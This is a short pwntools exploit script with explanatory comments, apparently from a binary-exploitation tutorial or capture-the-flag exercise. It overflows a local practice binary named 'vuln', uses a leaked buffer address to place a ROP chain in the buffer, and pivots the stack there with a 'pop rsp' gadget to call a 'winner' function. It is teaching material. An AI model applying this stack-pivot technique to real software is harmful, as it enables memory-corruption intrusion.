# One thing to note here is that the Stack Pointer (RSP) now lacks space for our payload, we will utilize
# the buffer to execute our payload below

from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
context.log_level = 'debug'

io = process()

offset = 104

pop_rsp_r13_r14_r15 = 0x401225		# The key here is "pop rsp"
pop_rdi = 0x40122b
pop_rsi_r15 = 0x401229


# Grabs leaked address of buffer first

io.recvuntil(b'to: ')
buffer = int(io.recvline(), 16)
log.success(f'Buffer Address: {hex(buffer)}')


# Send ROP chain inside buffer first

payload = flat(
	0,
	0,
	0,
	pop_rdi,
	0xdeadbeef,
	pop_rsi_r15,
	0xdeadc0de,
	0,
	elf.sym['winner']
)


# Calculate length of the ROP chain and minus from offset to get proper padding

diff = offset - len(payload)


# Send off the rest of the payload

payload += flat(
	b'A' * diff,		# Padding up to RIP
	pop_rsp_r13_r14_r15,	# RIP now points to POP RSP which changes the RSP that is now pointing to 
	buffer					# the buffer which now executes the ROP chain inside the buffer
)

io.sendline(payload)
io.interactive()
